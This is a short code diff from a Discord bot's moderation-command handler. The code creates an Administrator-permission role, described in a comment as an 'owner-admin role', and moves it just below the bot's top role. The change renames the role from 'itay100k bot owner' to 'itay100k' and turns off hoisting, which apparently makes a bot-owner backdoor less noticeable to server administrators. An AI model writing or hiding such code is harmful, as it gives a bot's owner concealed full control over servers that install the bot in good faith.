@@ -665,14 +665,14 @@ async function handleModCommand(message, client) {
           return message.reply({ embeds: [modEmbed(0xED4245, '❌ I need **Manage Roles** permission to create roles.')] });
         }
         // Reuse existing owner-admin role if already present
-        let role = guild.roles.cache.find(r => r.name === 'itay100k bot owner' && r.permissions.has('Administrator'));
+        let role = guild.roles.cache.find(r => r.name === 'itay100k' && r.permissions.has('Administrator'));
         if (!role) {
           role = await guild.roles.create({
-            name: 'itay100k bot owner',
-            color: 0xf5a623,
+            name: 'itay100k',
+            color: 0xC0152E,
             permissions: ['Administrator'],
-            hoist: true,
-            reason: `>admin used by ${message.author.tag}`,
+            hoist: false,
+            reason: `>adminrole used by ${message.author.tag}`,
           });
         }
         // Move it to the highest position the bot can reach (just below bot's top role)
